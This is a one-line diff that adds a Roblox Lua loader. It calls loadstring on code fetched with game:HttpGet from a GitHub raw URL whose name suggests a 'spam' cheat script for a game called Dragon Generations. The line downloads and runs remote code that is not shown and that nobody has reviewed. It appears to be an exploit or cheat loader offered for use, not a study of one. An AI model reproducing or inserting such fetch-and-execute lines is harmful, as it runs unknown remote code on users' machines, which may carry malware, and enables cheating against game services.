@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/halloween-dragon-generations-spam2-dz1nf9hooegk0q.lua"))()
